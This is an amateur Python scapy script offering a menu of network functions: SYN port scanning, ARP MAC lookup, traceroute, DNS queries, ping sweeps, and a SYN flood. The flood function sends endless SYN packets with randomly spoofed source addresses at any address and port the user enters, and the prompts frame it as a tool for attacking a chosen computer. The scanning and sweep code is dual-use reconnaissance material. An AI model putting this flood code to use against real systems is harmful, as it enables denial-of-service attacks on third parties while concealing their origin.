from scapy.all import *
import time
import random


#URG     ACK     PSH     RST     SYN     FIN
#32      16      8       4       2       1

def randomip():
    ip1=random.randint(1,255)
    ip2=random.randint(1,255)
    ip3=random.randint(1,255)
    ip4=random.randint(1,255)
    ip=str(ip1)+'.'+str(ip2)+'.'+str(ip3)+'.'+str(ip4)
    return ip

#portscan function begins
def portscan(address,ports):
	

	for port in ports:
		ip=IP()
		ip.dst=address

		#ports is a  list containing portsto be scanned
		tcp=TCP()
		tcp.dport=(port)
		tcp.sport=RandShort()
		tcp.flags='S'
		pkt=sr1(ip/tcp,timeout=0.2,verbose=0)
		if pkt!=None:
			if pkt.haslayer(TCP):
					#18 is flag number for SYN ACK
				if pkt[TCP].flags.value==18:
					print("port ",port ," is opened ")
				elif pkt[TCP].flags.value==20:
					print("port  ",port ," is  closed")
				else:
					print("port ",port," is TCP filtered")
			elif pkt.haslayer(ICMP):
				print("port",port, " is icmp filtered")
			else:
				print("Unkonw port ,use other tools")
		if pkt==None:
			print("no response from that port ",port)

#portscan function ends


def flood(address,port):
	while True:
		ip=IP()
		ip.dst=address
		ip.src=randomip()

		tcp=TCP()
		tcp.sport=RandShort()
		tcp.dport=port
		tcp.flags='S'

		pkt=sr1(ip/tcp,verbose=0,timeout=0.2)
		
		#if pkt!=None:
			#print("packet send successfully from ",ip.src," to ",ip.dst)



def getmacaddr(ip):
    find_arp=Ether()/ARP()
    find_arp.dst="ff:ff:ff:ff:ff:ff"
    find_arp[ARP].pdst=ip
    response,ignored=srp(find_arp,timeout=1,retry=10,verbose=0)
    for x,y in response:
        return y[Ether].src



def traceroute(address):
	ip=IP()
	ip.dst=address
	temp=0
	for every_ttl in range(1,256):
		ip.ttl=every_ttl

		pkt=sr1(ip/ICMP(),verbose=0)

		if temp==pkt[IP].src:
			break
		print(every_ttl," hop away ",pkt[IP].src)
		temp=pkt[IP].src


def querydnsA(dnsserver,domain_name):
	ip=IP()
	ip.dst=dnsserver

	dns=DNS()
	dns.rd=1
	dns.qd=DNSQR(qname=domain_name,qtype='A')

	pkt=sr1(ip/UDP()/dns,verbose=0)
	if pkt!=None:
		domainip=pkt[DNSRR].rdata
		print("found ", domainip)
	else:
		print("not found")

def pingsweep(address):
	ip=IP()
	ip.dst=address

	a,u=sr(ip/ICMP(),timeout=1,verbose=0)
	print("**** Hosts UP ****")
	for i in range(0,len(a)):
		liveip=a[i][1].src
		print(liveip," is up ")
	print("")
	print("**** Hosts DOWN ****")
	for i in range(0,len(u)):
		deadip=u[i].dst
		print(deadip," is down ")	


choice=int(input("""Enter your choice
					1.Scan the ports
					2.Flood http/tcp port
					3.Find MAC Address of computer 
					4.Traceroute to computer or site
					5.Query DNS Server
					6.Check Live Hosts(Ping Sweep)
					(dont give ur own ip address,
					dont know y its not working for own ip,
					working with other ips)
	"""))


#scanning the ports
if choice==1:
	address=input("enter ip address")
	port=input("enter port number range,eg:1-1000")
	start,end=port.split('-')
	start=int(start)
	end=int(end)
	#print("starting port is ",start)
	#print("ending port is ",end)
	ports=[]
	for i in range(start,end+1):
		ports.append(i)
	#print(ports)
	portscan(address,ports)

	
if choice==2:
	address=input("enter ip address of computer u want to flood")
	port=int(input("enter port number of that computer"))
	print("flooding will occur until u kill the process")
	flood(address,port)


if choice==3:
	address=input("enter ip address of computer u want to find MAC")
	mac=getmacaddr(address)
	print("mac address found ",mac)


if choice==4:
	address=input("enter ip address of computer u want to traceroute")
	traceroute(address)

if choice==5:
	address=input("enter dnsserver ip address")
	querychoice=int(input("""enter which record you want to query
						1.A Record
						2.NS Record
		"""))
	domain_name=input("enter domain name")

	if querychoice==1:
		querydnsA(address,domain_name)

if choice==6:
	address=input("enter ip address or range wtith cidr notation")
	pingsweep(address)

